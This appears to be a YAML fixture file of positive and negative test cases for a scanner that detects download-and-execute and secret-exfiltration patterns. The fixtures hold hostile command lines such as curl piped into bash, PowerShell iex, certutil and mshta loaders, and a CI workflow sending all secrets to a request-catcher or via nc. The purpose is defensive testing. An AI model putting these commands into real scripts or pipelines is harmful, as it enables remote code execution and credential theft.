# Test cases for area download_exec. Files are created under tmp_path only; all URLs
# use placeholder domains (example.invalid) or non-routable addresses and nothing is
# ever executed.

RC-DLX-001:
  positive:
    - name: curl piped into bash in a shell script
      files:
        scripts/install.sh: |
          #!/bin/sh
          curl -fsSL https://example.invalid/i.sh | bash
      expect: [{path: scripts/install.sh, line: 2}]
    - name: PowerShell download piped into iex
      files:
        setup.ps1: |
          iwr https://example.invalid/a.ps1 -UseBasicParsing | iex
      expect: [{path: setup.ps1, line: 1}]
    - name: Python runs a download through a shell
      files:
        tools/bootstrap.py: |
          os.system("wget -qO- https://example.invalid/x.sh | sh")
      expect: [{path: tools/bootstrap.py, line: 1, confidence: medium}]
    - name: detection pattern of a scanner in a raw string is reported with low confidence
      files:
        scanner/patterns.py: |
          PATTERNS = [
              (r"curl\s+[^|]*\|\s*(?:sudo\s+)?(?:python|python3|node)", 0.9),
          ]
      expect: [{path: scanner/patterns.py, line: 2, confidence: low}]
    - name: detection pattern in a JavaScript regex literal is reported with low confidence
      files:
        src/rules.js: |
          const pipe = /wget\s+[^|]*\|\s*(?:node|python)/;
      expect: [{path: src/rules.js, line: 1, confidence: low}]
    - name: regex syntax outside a string does not lower the confidence
      files:
        install.sh: |
          curl -fsSL https://example.invalid/i.sh | grep -v '^\s*#' | sh
      expect: [{path: install.sh, line: 1, confidence: medium}]
    - name: download piped into env sh, sudo with options and an absolute shell path
      files:
        a.sh: "curl -s https://example.invalid/p | env sh\n"
        b.sh: "curl -fsSL https://example.invalid/p | sudo -E bash -s -- --quiet\n"
        c.sh: "wget -qO- https://example.invalid/p | /usr/bin/env bash\n"
        d.sh: "curl -s https://example.invalid/p | bash -ex\n"
      expect: [{path: a.sh, line: 1}, {path: b.sh, line: 1}, {path: c.sh, line: 1}, {path: d.sh, line: 1}]
    - name: command substitution of a download given to sh -c, eval, python -c and node -e
      files:
        a.sh: "sh -c \"$(curl -s https://example.invalid/p)\"\n"
        b.sh: "eval \"$(wget -qO- https://example.invalid/p)\"\n"
        c.sh: "python3 -c \"$(curl -s https://example.invalid/p.py)\"\n"
        d.sh: "node -e \"$(curl -s https://example.invalid/p.js)\"\n"
      expect: [{path: a.sh, line: 1}, {path: b.sh, line: 1}, {path: c.sh, line: 1}, {path: d.sh, line: 1}]
    - name: backtick command substitution of a download
      files:
        setup.sh: "bash -c \"`curl -s https://example.invalid/p`\"\n"
      expect: [{path: setup.sh, line: 1}]
    - name: pipe into the shell on a continuation line
      files:
        setup.sh: "#!/bin/sh\ncurl -s https://example.invalid/p \\\n  | sh\n"
      expect: [{path: setup.sh, line: 2}]
  negative:
    - name: download piped into a shell in a comment
      files:
        install.ps1: |
          # Users can rerun irm https://example.invalid/i.ps1 | iex in the same session.
    - name: attack string in a test module
      files:
        tests/test_scanner.py: |
          SAMPLE = "curl -s https://example.invalid/x.sh | sh"
    - name: install instructions in a README
      files:
        README.md: |
          curl -fsSL https://example.invalid/i.sh | bash
    - name: download to a file without running it
      files:
        fetch.sh: |
          curl -fsSL -o data.json https://example.invalid/data.json
    - name: Dockerfile (runs inside the container build)
      files:
        Dockerfile: |
          RUN curl -fsSL https://example.invalid/setup.sh | bash -
    - name: download piped into tools that do not run it
      files:
        a.sh: "curl -s https://example.invalid/p | env grep x\ncurl -s https://example.invalid/p | shasum -a 256\n"
        b.sh: "eval \"$(ssh-agent -s)\"\nVERSION=\"$(curl -s https://example.invalid/version)\"\n"
    - name: continuation lines without a pipe into a shell
      files:
        fetch.sh: "curl -s https://example.invalid/p \\\n  -o data.json\nsh build.sh\n"
    - name: download piped into a command whose name starts like a shell
      files:
        pip.plugin.zsh: "curl -L $index 2>/dev/null | \\\n  zsh-pip-clean-packages >> $tmp_cache\n"
    - name: download read as data by an inline script
      files:
        a.sh: "version=\"$(curl -s https://example.invalid/index.json \\\n  | node -e \"let d='';process.stdin.on('data',c=>d+=c)\")\"\n"
        b.sh: "curl -s https://example.invalid/get.html | perl -wlne 'print $1 if /perl-([0-9.]+)/'\n"
        c.sh: "curl -s https://example.invalid/v.json | python3 -c 'import json,sys; print(json.load(sys.stdin))'\n"
        d.sh: "wget -qO- https://example.invalid/list | sh -c 'while read l; do echo $l; done'\n"

RC-DLX-002:
  positive:
    - name: certutil downloads a file
      files:
        get.bat: |
          certutil -urlcache -split -f http://example.invalid/a.exe a.exe
      expect: [{path: get.bat, line: 1}]
    - name: mshta runs a remote HTA
      files:
        run.cmd: |
          mshta https://example.invalid/x.hta
      expect: [{path: run.cmd, line: 1}]
    - name: regsvr32 scriptlet from a URL
      files:
        go.ps1: |
          regsvr32 /s /n /u /i:https://example.invalid/x.sct scrobj.dll
      expect: [{path: go.ps1, line: 1}]
  negative:
    - name: certutil computes a hash
      files:
        verify.bat: |
          certutil -hashfile release.zip SHA256
    - name: regsvr32 registers a local DLL
      files:
        register.cmd: |
          regsvr32 /s mylib.dll

RC-DLX-003:
  positive:
    - name: Python executes a web response
      files:
        update.py: |
          import requests
          exec(requests.get("https://example.invalid/patch.py").text)
      expect: [{path: update.py, line: 2}]
    - name: JavaScript evaluates fetched code
      files:
        load.mjs: |
          eval(await (await fetch("https://example.invalid/x.js")).text());
      expect: [{path: load.mjs, line: 1}]
  negative:
    - name: JSON from a web request
      files:
        client.py: |
          data = requests.get("https://example.invalid/api").json()
    - name: exec without a download
      files:
        run.py: |
          exec(compile(source, "plugin.py", "exec"))

RC-DLX-004:
  positive:
    - name: download into /tmp and make executable
      files:
        drop.sh: |
          #!/bin/sh
          curl -s -o /tmp/agent https://example.invalid/agent
          chmod +x /tmp/agent
          /tmp/agent
      expect: [{path: drop.sh, line: 3}]
    - name: PowerShell starts a downloaded file from TEMP
      files:
        drop.ps1: |
          Invoke-WebRequest https://example.invalid/a.exe -OutFile "$env:TEMP\a.exe"
          Start-Process "$env:TEMP\a.exe"
      expect: [{path: drop.ps1, line: 2}]
  negative:
    - name: chmod on a temp file without any download
      files:
        build.sh: |
          cp tool /tmp/tool
          chmod +x /tmp/tool
    - name: download into /tmp without running it
      files:
        cache.sh: |
          curl -s -o /tmp/data.json https://example.invalid/data.json
          chmod +x ./bin/tool

RC-DLX-005:
  positive:
    - name: data posted to a request catcher
      files:
        telemetry.py: |
          requests.post("https://webhook.site/0000-test", data=info)
      expect: [{path: telemetry.py, line: 1}]
    - name: raw public IP address
      files:
        beacon.js: |
          fetch("http://240.0.0.7/c");
      expect: [{path: beacon.js, line: 1}]
  negative:
    - name: public resolvers, carrier-grade NAT and example.com addresses
      files:
        net.py: |
          PROBE = "http://8.8.8.8"
          PROXY = "http://100.68.58.50:3128"
          EXAMPLE = "https://93.184.215.14/"
    - name: local and private addresses
      files:
        dev.py: |
          URL = "http://127.0.0.1:8000"
          LAN = "http://192.168.1.10/api"
          DOC = "http://192.0.2.10/"
    - name: ordinary API host
      files:
        api.ts: |
          const base = "https://api.example.invalid/v1";
    - name: webhook in documentation
      files:
        docs/integrations.md: |
          Send events to https://hooks.slack.com/services/T000/B000/XXXX

RC-DLX-006:
  positive:
    - name: all secrets posted to a request catcher
      files:
        .github/workflows/sync.yml: |
          on: push
          jobs:
            process:
              runs-on: ubuntu-latest
              steps:
                - run: echo "$ENDPOINT" > /dev/null
                  env:
                    ENDPOINT: https://webhook.site/00000000-0000-0000-0000-000000000000
                    CONTENTS: ${{ toJSON(secrets) }}
      expect: [{path: .github/workflows/sync.yml, line: 8}]
    - name: one secret sent to a paste service
      files:
        .github/workflows/debug.yaml: |
          on: workflow_dispatch
          jobs:
            dump:
              runs-on: ubuntu-latest
              env:
                TOKEN: ${{ secrets.NPM_TOKEN }}
              steps:
                - run: echo "$TOKEN" | nc termbin.com 9999
      expect: [{path: .github/workflows/debug.yaml, line: 8}]
  negative:
    - name: chat notification with a secret webhook
      files:
        .github/workflows/notify.yml: |
          on: release
          jobs:
            notify:
              runs-on: ubuntu-latest
              steps:
                - run: curl -X POST "https://hooks.slack.com/services/${{ secrets.SLACK_PATH }}" -d '{"text":"released"}'
                - run: curl "https://api.telegram.org/bot${{ secrets.TG_TOKEN }}/sendMessage?chat_id=1&text=ok"
    - name: request catcher in a job without secrets
      files:
        .github/workflows/test.yml: |
          on: push
          jobs:
            test:
              runs-on: ubuntu-latest
              steps:
                - run: curl -s https://webhook.site/00000000-0000-0000-0000-000000000000/ping
            deploy:
              runs-on: ubuntu-latest
              steps:
                - run: ./deploy.sh
                  env:
                    KEY: ${{ secrets.DEPLOY_KEY }}

RC-DLX-007:
  positive:
    - name: download in a variable run with sh -c on the same line
      files:
        preinstall.sh: |
          #!/bin/sh
          S=$(curl -s https://example.invalid/payload); sh -c "$S"
      expect: [{path: preinstall.sh, line: 2}]
    - name: download in a variable run with eval on a later line
      files:
        setup.sh: |
          #!/bin/sh
          STAGE="$(wget -qO- https://example.invalid/payload)"
          echo "updating"
          eval "$STAGE"
      expect: [{path: setup.sh, line: 2}]
    - name: download in a variable run with python -c
      files:
        tools/run.sh: |
          CODE=`curl -s https://example.invalid/p.py`
          python3 -c "${CODE}"
      expect: [{path: tools/run.sh, line: 1}]
  negative:
    - name: downloaded version number used as data
      files:
        release.sh: |
          VERSION=$(curl -s https://example.invalid/latest)
          echo "latest is $VERSION"
          sh -c "echo $VERSION > version.txt"
    - name: different variable is run
      files:
        build.sh: |
          DATA=$(curl -s https://example.invalid/data.json)
          CMD="make all"
          eval "$CMD"
    - name: script in a test folder
      files:
        tests/fixtures/s.sh: |
          S=$(curl -s https://example.invalid/payload); sh -c "$S"
